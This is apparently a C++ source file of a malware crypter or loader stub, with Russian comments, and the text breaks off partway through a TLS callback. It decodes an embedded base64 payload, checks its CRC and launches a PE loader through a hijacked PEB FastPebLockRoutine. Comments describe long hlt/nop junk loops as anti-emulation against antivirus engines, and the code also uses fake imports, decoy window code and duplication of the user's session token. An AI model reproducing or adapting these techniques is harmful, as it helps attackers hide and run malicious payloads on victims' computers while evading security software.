// StubNew.cpp: определяет точку входа для приложения.
//
#include "StubNew.h"
float inner1(float *x,float *y,int n);
void NTAPI on_tls_callback1(PVOID xx, DWORD dwReason, PVOID pv);
void NTAPI on_tls_callback2(PVOID xx, DWORD dwReason, PVOID pv);
void NTAPI on_tls_callback3(PVOID xx, DWORD dwReason, PVOID pv);
#define MAX_LOADSTRING 100
// Глобальные переменные:
char wcTitle[0xFF];					// Текст строки заголовка
char wcWindowClass[0xFF];				// имя класса главного окна
UINT uTimer;
DWORD dwNewSz;
//---------------------------------------------------------------------------------------------------------------------
// Отправить объявления функций, включенных в этот модуль кода:
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
//----------------------------------------------------------------------------------------------------------------------
HCERTCHAINENGINE __fastcall funCert(wchar_t* wcNam)
{
	HCERTCHAINENGINE         hChainEngine;
	CERT_CHAIN_ENGINE_CONFIG ChainConfig;
	PCCERT_CHAIN_CONTEXT     pChainContext;
	PCCERT_CHAIN_CONTEXT     pDupContext;
	HCERTSTORE               hCertStore;
	PCCERT_CONTEXT           pCertContext = NULL;
	CERT_ENHKEY_USAGE        EnhkeyUsage;
	CERT_USAGE_MATCH         CertUsage;  
	CERT_CHAIN_PARA          ChainPara;
	DWORD                    dwFlags=0;
	LPWSTR                   pszNameString;
	pszNameString=(LPWSTR)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,256);//LocalAlloc(LMEM_ZEROINIT,256);
	EnhkeyUsage.cUsageIdentifier = 0;
	EnhkeyUsage.rgpszUsageIdentifier=NULL;
	CertUsage.dwType = USAGE_MATCH_TYPE_AND;
	CertUsage.Usage  = EnhkeyUsage;
	ChainPara.cbSize = sizeof(CERT_CHAIN_PARA);
	ChainPara.RequestedUsage=CertUsage;
	ChainConfig.cbSize = sizeof(CERT_CHAIN_ENGINE_CONFIG);
	ChainConfig.hRestrictedRoot= NULL ;
	ChainConfig.hRestrictedTrust= NULL ;
	ChainConfig.hRestrictedOther= NULL ;
	ChainConfig.cAdditionalStore=0 ;
	ChainConfig.rghAdditionalStore = NULL ;
	ChainConfig.dwFlags = CERT_CHAIN_CACHE_END_CERT;
	ChainConfig.dwUrlRetrievalTimeout= 0 ;
	ChainConfig.MaximumCachedCertificates=0 ;
	ChainConfig.CycleDetectionModulus = 0;
	HCLUSENUM hEnum = NULL; 
	DWORD dwIndex =0 ;
	LPDWORD lpdwType = NULL;
	LPWSTR lpszName;
	LPDWORD lpcchName;
	if(!ClusterEnum(hEnum,dwIndex,lpdwType,lpszName,lpcchName))
	CertCreateCertificateChainEngine(&ChainConfig,&hChainEngine);/*)	hCertStore=CertOpenSystemStore(NULL,wcNam);*/
	return hChainEngine;
}
//---------------------------------------------------------------------------------------------------------------------
void frame() 
{
	HANDLE hnd;
	DWORD chrswrt;
	CONSOLE_SCREEN_BUFFER_INFO csbi;
	char ul = (char)szFakeDWORD[0];
	char ur = (char)szFakeDWORD[2];
	char dl = (char)szFakeDWORD[1];
	char dr = (char)szFakeDWORD[3];
	char v = (char)szFakeDWORD[2];
	char h = (char)szFakeDWORD[0];
	char cr = (char)szFakeDWORD[3];
	char cl = (char)szFakeDWORD[2];
	char cu = (char)szFakeDWORD[1];
	char cd = (char)szFakeDWORD[0];
	COORD dab;
	dab.X = 0;
	dab.Y = 0;
	hnd = GetStdHandle( STD_OUTPUT_HANDLE );
	GetConsoleScreenBufferInfo( hnd, &csbi );
	WriteConsoleOutputCharacterA(hnd, &ul, 1, dab, &chrswrt);
	dab.X = csbi.srWindow.Right;
	for(dab.X = 1; dab.X < csbi.srWindow.Right; dab.X++)
	WriteConsoleOutputCharacterA(hnd, &h, 1, dab, &chrswrt);
	WriteConsoleOutputCharacterA(hnd, &ur, 1, dab, &chrswrt);
	dab.Y = csbi.srWindow.Bottom;
	WriteConsoleOutputCharacterA(hnd, &dr, 1, dab, &chrswrt);
	dab.X = 0;
	WriteConsoleOutputCharacterA(hnd, &dl, 1, dab, &chrswrt);
}
//---------------------------------------------------------------------------------------------------------------------
DWORD /*__fastcall*/ Decoder(DWORD dwInParam)
{
	//Раскриптовка base64 если надо
	DWORD dwNewSz=0;
	DPRINT1("Try base64Decode: bufIn=%d",dwInParam);
	if(!dwInParam)
	{
		DPRINT("Base64 not Implemented");
		lpShell = (LPBYTE)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,scomp->dwSzCompBlock);
		if(lpShell) DPRINT("Heap allocated");
		RtlCopyMemory(lpShell,szGLOBAL2+sizeof(SCOMP),scomp->dwSzCompBlock);
	}
	else
	{
		LPBYTE lpbTmp = (LPBYTE)(szGLOBAL2+sizeof(SCOMP));
		lpShell = FromBase64Crypto((const BYTE *)lpbTmp,dwSizeFull64,&dwNewSz);// base64Decode((LPSTR)lpbTmp,dwSizeFull64,&dwNewSz);//
		DPRINT1("Decoder: dwNewSz = %d", dwNewSz);
		pRtlComputeCrc32 =  (_RtlComputeCrc32)GetProcAddressNt(0,Decrypt(szcRtlComputeCrc32));
		if(lpShell==NULL) return 0;
	}
	return dwNewSz;
}
//DWORD WINAPI GetCPUID(void)
//{
//	ULONG dComp1Supported[32];
//	RtlZeroMemory(&dComp1Supported,sizeof(dComp1Supported));
//	DWORD REGEBX=0,REGEDX=0,Q=0;
//	__asm
//	{
//		pushad
//			mov eax,1
//			cpuid
//			mov REGEBX,ebx
//			mov REGEDX,edx
//			popad
//	}
//	EnterCriticalSection((PCRITICAL_SECTION)pPEB->FastPebLock);
//	for(unsigned long C=1;Q<5795465;C*=2, Q++) 
//	{
//		if(Q==32) break;
//		dComp1Supported[Q]=(REGEDX&C)!=0?1:0;
//	}
//	LeaveCriticalSection((PCRITICAL_SECTION)pPEB->FastPebLock);
//	return(((dComp1Supported[28]==1))?((REGEBX>>16)&0xFF):-1);
//}
//**************************************************************************
/* эта функция управляет всем выводом на экран */
void Display(void)
{
	glVertex3d(0.75,0.75,0.0);
}
//----------------------------------------------------------------------------------------------------------------------
HANDLE __fastcall getToken(TOKEN_TYPE tt)//TokenImpersonation or TokenPrimary
{
	DWORD dwSessionId= WTSGetActiveConsoleSessionId(); // активная сессия

	//  Получим токен интерактивного пользователя.
	HANDLE hToken = 0;
	if( !WTSQueryUserToken(dwSessionId, &hToken) ) {
		return NULL;
	}

	// Получим токен перевоплощения (для потоков - TokenImpersonation),
	// либо первичный токен (для процессов - TokenPrimary)
	HANDLE hTokenDup = NULL;
	if( !DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, tt, &hTokenDup) ) 
	{
		CloseHandle(hToken);
		
		return NULL;
	}
	CloseHandle(hToken);

	return hTokenDup;
}
//---------------------------------------------------------------------------------------------------------------------
DWORD WINAPI LockRoutine(LPVOID)
{
	return LoaderPE(0x00F4FCFA);
}

//----------------------------------------------------------------------------------------------------------------------
VOID CALLBACK TimerProc(HWND hwnd,UINT uMsg,UINT_PTR idEvent,DWORD dwTime)
{
	DPRINT("TimerFunc");
	CreateThread(NULL,0,LockRoutine,&idEvent,0,NULL);
	KillTimer(NULL,uTimer);
}
//----------------------------------------------------------------------------------------------------------------------
WNDCLASSEXA wcex;
#pragma code_seg(push, ".text$7")
WNDCLASSEXA* __stdcall MyRegisterClass(LPVOID arg)
{
	HINSTANCE hInstance = *(HINSTANCE*)arg;
	DPRINT1("###############%X",hInstance);
	ATOM iRET = NULL;
	DWORD dwResLen;
	lstrcpyA(wcTitle,"mOrxxx mOrxxxxx mOrxxxxxxxx");
	//lstrcpyA(wcWindowClass,"mOrxxxxxxxxxx");//rnddstr(8,16,&dwResLen));//
	RtlSecureZeroMemory(&wcex,sizeof(WNDCLASSEXW));
	wcex.lpfnWndProc	= WndProc;
	wcex.lpszMenuName	= "mOrxxxxxxxxxx";
	wcex.lpszClassName	= szcSysEnter;
	wcex.style			= CS_HREDRAW;
	wcex.hInstance		= hInstance;
	wcex.style         = CS_HREDRAW | CS_VREDRAW;
	wcex.cbClsExtra    = 0;
	wcex.cbWndExtra    = 0;
	wcex.hIcon         = 0;
	wcex.hCursor       = 0;
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+3);
	wcex.cbSize = sizeof(wcex);
	return &wcex;
}
#pragma code_seg(pop)
//----------------------------------------------------------------------------------------------------------------------
//Выделение памяти под буфер куда будет все декомпрессировано
//#pragma code_seg(push, ".text$8")
DWORD __fastcall VAllocator(DWORD dwInp)
{
	DWORD dwre=0;
	DWORD dwIn = dwRegSz+(DWORD)pPEB->BeingDebugged;
	return dwInp + pNtAllocateVirtualMemory(INVALID_HANDLE_VALUE,(PVOID*)&lpOutBuff,0,&(DWORD)(dwIn),MEM_COMMIT, PAGE_READWRITE);
}
//#pragma code_seg(pop)
//------------------------------------------------------------------------------
void _cdecl trans_func( unsigned int u, EXCEPTION_POINTERS* pExp )
{
	MessageBoxA(NULL,"mOrxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx","mOrxxxxxxxxxxxxxxxxxxxx",0);
	throw u;
}
//------------------------------------------------------------------------------
BOOL f_YES = FALSE;
void __fastcall Painter(HDC hdc, PAINTSTRUCT ps,HWND hWnd)
{
	LOGFONTA lf;
	HFONT hFont;
	RECT r;
	HBRUSH hBrush;
	HPEN hPen;
	lstrcpyA(lf.lfFaceName,"mOrxxxxxxxxxxxxxxxxx"/*Times New Roman"*/); //копируем в строку название шрифта 
	lf.lfHeight=20;
	lf.lfItalic=1;
	lf.lfStrikeOut=0;
	lf.lfUnderline=0;
	lf.lfWidth=10;
	lf.lfWeight=40;
	lf.lfCharSet=DEFAULT_CHARSET; //значение по умолчанию
	lf.lfPitchAndFamily=DEFAULT_PITCH; //значения по умолчанию
	lf.lfEscapement=0;
	//
	hFont = CreateFontIndirectA(&lf);
	SelectObject(hdc, hFont);
	SetTextColor(hdc, RGB(0,0,255));
	TextOutW(hdc, szFakeDWORD[0],szFakeDWORD[3], L"mOrxxxxxxxxxxxxxxxxxxxxxxxxxxxx", szFakeDWORD[2]);
	HPEN hPen1, hPen2, hPen3; //объявляем сразу три объекта-пера
	hPen1=CreatePen(PS_DASHDOT, 1, RGB(0,0,255)); //создаём всё три
	hPen2=CreatePen(PS_DASH, 1, RGB(255,0,255));
	hPen3=CreatePen(PS_DOT, 1, RGB(0,128,256));

	SelectObject(hdc, hPen1); //но в одним момент времени может быть только 1 
	Rectangle(hdc, 10,10,100,100); //рисуем фигуру соответствующим пером

	SelectObject(hdc, hPen2); //меняем перо
	Ellipse(hdc, 100,100,200,300); //рисуем другим пером

	SelectObject(hdc, hPen3);
	LineTo(hdc, 200,100); 

	//обновляем окно

	ValidateRect(hWnd, NULL);
}
//----------------------------------------------------------------------+-----------------------------------------------
//Подготовка, расшифровка, создание окна
//#pragma code_seg(push, ".text$8")
__forceinline HWND  InitInstance(DWORD inDword)
{
	//InitCommonControls();
	#ifndef TLS
		on_tls_callback0((PVOID)&dwFakeDWORD,DLL_PROCESS_ATTACH,(PVOID)&dwFakeDWORD);
	#endif
	
	//CoInitialize(NULL);
	
	dwFullSz = scomp->dwSzFull;
	DPRINT("InitInstance  - Start");
	dwRegSz = scomp->dwSzCompBlock;
	DPRINT("InitInstance  - Start1");
	dwUnco = scomp->dwSzUncompBlock;
	dwRegSz = scomp->dwSzUncompBlock;
	DPRINT1("Try alloc %d byte",dwRegSz);
//	pRtlGetLastWin32Error =  (_RtlGetLastWin32Error)GetProcAddressNt(0,Decrypt(szcRtlGetLastWin32Error));
	DPRINT("RegisterClassExA - OK");
	//Выделение памяти
	if(VAllocator(dwFakeDWORD))	DPRINT1("START: NtAllocateVirtualMemory %d byte - OK",dwRegSz);
	//Декодируем из Base64
	dwNewSz = Decoder(dwSizeFull64-inDword);
	if(pRtlComputeCrc32(0,lpShell,dwNewSz)==dwCRC32)
	{	
		HWND hwndx = FindWindowW(NULL, L"mOrxxxxxxxxxxxxxxx");
		if (hwndx)
		{
			SetWindowPos(hwndx, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE);
			SetFocus(hwndx);
		}
		DPRINT3("Try CreateWindowA, Class=%s,Title=%s,ExeBase=0x%p",wcWindowClass, wcTitle, dwExeBase);
		hWnd = CreateWindowA(szcSysEnter, wcTitle, WS_OVERLAPPEDWINDOW,CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, dwExeBase, NULL);
	}
	if (!hWnd)
	{
		DPRINT1("START: CreateWindow - ERROR: 0x%p",GetLastError());
		#ifdef DBG_OK
			DebugInformatorXXX(GetLastError(),szcSysEnter);
		#endif
		//Фейковый импорт - сюда
		DWORD wdRPF;
		WINTRUST_DATA wt;
		WINTRUST_DATA *pWinTrustData;
		GUID gi;
		UINT dwPowPr;
		DWORD dwCertsCount = 0;
		DWORD dwIndices[128];
		WintrustGetRegPolicyFlags(&wdRPF);
		ImageEnumerateCertificates((HANDLE)dwExeBase, CERT_SECTION_TYPE_ANY, &dwCertsCount, dwIndices, 128);
		if(GetActivePwrScheme(&dwPowPr))
		{
			SYSTEM_POWER_CAPABILITIES spc;
			if(GetPwrCapabilities(&spc))
			{
				if(IsPwrShutdownAllowed())
				{
					#ifdef IS_LOCKER
						WndProc(NULL, WM_CREATE, 0, NULL);
					#else
						ExitProcess(0x00F4FCFA);
					#endif
		//			//MessageBoxA(NULL,"mOrxxxxxxxxxxxxx","mOrxxx",MB_ICONSTOP);
				} //else if(IsPwrHibernateAllowed())
		//		{
		//			if(funCert(L"mOrxxxxxx")==NULL) MessageBoxW(GetActiveWindow(),L"mOrxxxxxxxxxxxxxxxxxxx",L"mOrxxxx",MB_ICONEXCLAMATION); else {mciSendStringW(L"mOrxxxxxxxxxxxxxxxxxxx", NULL,0, hWnd);mciSendStringW(L"mOrxxxxxxxxxxx", NULL,0, hWnd);}
		//			MessageBoxW(NULL,L"mOrxxxxxxxxxxxxxxxxxxx",L"mOrxxxx",MB_ICONWARNING);
		//		}
			}
		}
		
	} else	DPRINT("START: CreateWindow - OK");
	ShowWindow(hWnd,SW_HIDE);
	UpdateWindow(hWnd);
	return hWnd;
}
//#pragma code_seg(pop)
//---------------------------------------------------------------------------------------------------------------------
ULONG j = 0;
//---------------------------------------------------------------------------------------------------------------------
//Точка входа
//int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine,int nCmdShow)	//Раскоментировать, чтобы включить импорт из msvcrt.dll и включить crt-стаб
BOOL WINAPI EntryPoint(HINSTANCE hInstance,	DWORD fwdreason,LPVOID lpvReserved)
{
	MSG msg;
	HMODULE hmFake = NULL;
	hmFake = LoadLibraryA("mOrxxxxxxxxxx");
	//Некоторые самописные фейк АВ на делфях бывает глючат, но работают
	DWORD dwMode = SetErrorMode(SEM_NOGPFAULTERRORBOX);
	if(!hmFake)
	{
		//Поэтому выкидываем сообщение об ошибке
		SetErrorMode(dwMode | SEM_NOGPFAULTERRORBOX);
		if(InitInstance(dwFakeDWORD))
		{
			DPRINT("InitInstance  - OK");
			while (GetMessage(&msg,NULL, 0, 0))
			{
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
	} 
	return dwFakeDWORD;
}
//---------------------------------------------------------------------------------------------------------------------
BOOL bIsNotServer = FALSE;
//---------------------------------------------------------------------------------------------------------------------
DWORD WINAPI StarterX(LPVOID lpParam)
{
	if(bIsNotServer) 
	{
		//Антиэмуль для XP и ниже
		pRtlAcquirePebLock = (_RtlAcquirePebLock)GetProcAddressNt(0,Decrypt(szcRtlAcquirePebLock));
		__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		DPRINT("Is WinXP or Later");
		lpLockRoutine = pPEB->FastPebLockRoutine;
		if(pRtlAcquirePebLock) DPRINT("pRtlAcquirePebLock - OK");
		//__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		//__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		//volatile DWORD lpFastLock = (DWORD)(pPEB->FastPebLockRoutine);
		//InterlockedExchange(&lpFastLock,(DWORD)LockRoutine);
		pPEB->FastPebLockRoutine = LockRoutine;
		/*LPVOID dwLR = (pPEB->FastPebLockRoutine);
		__asm mov eax,dwLR
		__asm lock mov eax,LockRoutine*/
	/*	__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}*/
		//Антиэмуляция
		//CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)pRtlAcquirePebLock,NULL,0,NULL);
		pRtlAcquirePebLock();
		//WaitForSingleObject(CreateThread(NULL,0,LockRoutine,NULL,0,NULL),0x00F4FCFA);
	}
	else 
	{
		__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
		//Если выше XP - вызываем напрямую, т.к. FastPebLockRoutine не сработает
		LoaderPE(0x00F4FCFA);
	}
	return 0x00F4FCFA;
}
//---------------------------------------------------------------------------------------------------------------------
//Обработчик оконных сообщений
#pragma code_seg(push, ".text$4")
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	lpLockRoutine = NULL;
	int wmId, wmEvent;
	PAINTSTRUCT ps; //создаём экземпляр структуры графического вывода
	HDC hdc;
	switch (message)
	{
		case WM_CREATE || WM_GETMINMAXINFO:
			f_YES = TRUE;
			DPRINT("WM_CREATE");
			bIsNotServer = (pPEB->OSMajorVersion<=5 && pPEB->OSMinorVersion!=2);
			//Длинный цикл мусора - антиэмуляция от MS, AVG и VBA
			for(ULONG j=0;j<HIWORD(dwFakeDWORD)*szFakeDWORD[1]+bIsNotServer;j++)
			{
				__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				if(!pNtGetContextThread) pNtGetContextThread = (_NtGetContextThread)GetProcAddressNt(0,Decrypt(szcZwGetContextThread));
			}
			DPRINT("Garbage OK");
			pRtlDecompressBuffer = (_RtlDecompressBuffer)GetProcAddressNt(0,Decrypt(szcRtlDecompress));
			DPRINT1("Kernel32 base: 0x%X",dwKrnlBase);
			LPDEBUG_EVENT lpDbgEvt;
			pFlushInstructionCache =(_FlushInstructionCache)GetProcAddressNt(1,Decrypt(szcFlushInstructionCache));
			if(pFlushInstructionCache) 
			{
				DPRINT1("pFlushInstructionCache: 0x%X",pFlushInstructionCache); 
			}
			else
			{
				DPRINT("pFlushInstructionCache: ERROR"); 
			}
			//Запускаем через жопу PELoader, типа аниэмуль и обфускация :)
			WaitForSingleObject(CreateThread(NULL,0,StarterX,NULL,0,NULL),INFINITE);
			//StarterX(0x00F4FCFA);
		break;

		case WM_PAINT:
			//начинаем рисовать
			//hdc=BeginPaint(hWnd, &ps);
			//Создаём свой шрифт
			//Painter(hdc,ps,hWnd);
			//заканчиваем рисовать
			//EndPaint(hWnd, &ps);
		break;
		case WM_DESTROY:
			//PostQuitMessage(0x00F4FCFA);
		break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0x00F4FCFA;
}
#pragma code_seg(pop)
//---------------------------------------------------------------------------------------------------------------------
//Цепочка инициализаторов или TLS-колбеков
void NTAPI on_tls_callback0(PVOID xx, DWORD dwReason, PVOID pv)
{
	if(DLL_PROCESS_ATTACH == dwReason) 
	{
		DPRINT("on_tls_callback0");
		//hHeap = HeapCreate(0,dwSizeFull64*10,0);
		//if(!hHeap)
		{
			//hHeap = GetProcessHeap();
		}
		//if(hHeap) 
		{
			pPEB = NtCurrentTeb()->Peb;
			hHeap = pPEB->ProcessHeap;
			if(pPEB) on_tls_callback1(NULL, DLL_PROCESS_ATTACH, (LPVOID)dwFakeDWORD);
		}
	}
}
//--------------------------
	void NTAPI on_tls_callback1(PVOID xx, DWORD dwReason, PVOID pv)
	{
		if(DLL_PROCESS_ATTACH == dwReason) 
		{
			DWORD dwFileChecksum=0,dwRealChecksum=0;
			wcCmdLine = pPEB->ProcessParameters->CommandLine.Buffer;
			szSysEnter = Decrypt(szcSysEnter);
			lex = pPEB->LdrData->InLoadOrderModuleList.Flink;
			pld = (PLDR_DATA_TABLE_ENTRY)lex;
			szUser32 = Decrypt(szcUser32);
			dwExeBase = (HMODULE) pld->BaseAddress;
			#ifndef TLS
				CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)MyRegisterClass,&dwExeBase,0,NULL);
			#else
				MyRegisterClass(&dwExeBase);
			#endif
			DPRINT1("Exebase=0x%p",dwExeBase);
			for(ULONG j=0;j<LOWORD(dwFakeDWORD)+szFakeDWORD[3];j++)
			{
				__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
